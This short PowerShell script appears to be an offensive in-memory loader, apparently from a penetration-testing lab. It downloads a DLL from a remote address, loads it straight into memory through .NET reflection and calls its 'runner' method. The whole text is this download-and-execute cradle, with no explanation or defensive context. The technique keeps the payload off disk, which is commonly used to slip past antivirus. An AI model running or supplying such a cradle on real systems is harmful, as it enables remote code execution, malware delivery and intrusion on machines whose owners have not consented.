$dll = (new-object net.webclient).DownloadData("http://192.168.49.83/ClassLibrary1-x86.dll")
[System.Reflection.Assembly]::Load($dll)
[ClassLibrary1.Class1]::runner()
